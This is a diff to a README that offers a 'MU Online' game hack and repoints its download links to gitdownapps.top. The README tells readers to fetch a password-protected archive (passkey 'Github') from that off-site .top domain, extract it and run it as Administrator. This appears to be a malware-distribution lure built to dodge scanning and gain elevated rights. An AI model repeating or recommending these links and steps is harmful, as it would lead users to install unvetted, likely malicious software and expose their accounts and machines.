@@ -6,7 +6,7 @@ MU Online external hack with auto-potion, speed hack, item filter, radar, and mo
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -71,7 +71,7 @@ Based on popular tools like **MU Helper** and **MUEME**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch MU Online.
 4. Run the hack **as Administrator**.
